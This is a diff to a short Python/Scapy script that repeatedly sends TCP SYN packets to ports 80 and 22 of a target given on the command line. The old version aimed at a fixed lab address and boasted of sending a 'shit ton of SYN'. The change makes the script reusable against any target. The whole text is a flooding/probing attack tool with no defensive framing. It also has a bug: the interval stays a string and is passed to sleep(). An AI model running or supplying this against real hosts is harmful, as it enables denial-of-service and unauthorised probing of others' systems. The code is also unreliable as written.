@@ -1,17 +1,24 @@
 from scapy.all import *
 from time import sleep
+from random import randint
 
-target_ip = "192.168.56.10"
-interval = 0.1
+import sys
 
-network_layer = IP(dst = target_ip)
+if len(sys.argv) < 3:
+    print("Please provide a target ip and interval and try again.")
+    sys.exit()
 
-counter = 0
-while(counter<=10):
-    counter+=1
-    port = RandShort()
-    transport_layer = TCP(sport = port, dport=[80, 22], flags = "S")
-    print("Sending shit ton of SYN to " + target_ip)
-    send(network_layer/transport_layer, verbose=False)
+target_ip = sys.argv[1]
+interval = sys.argv[2]
+
+for x in range(1,10):
+    network_layer = IP(dst = target_ip)
+    transport_layer = TCP(sport = randint(1025, 65535), dport=[80, 22], flags = "S")
+
+    packet = network_layer/transport_layer
+
+    print("Sending SYN segment to " + target_ip)
+    send(packet, verbose = False)
+
     print("Done sending")
     sleep(interval)
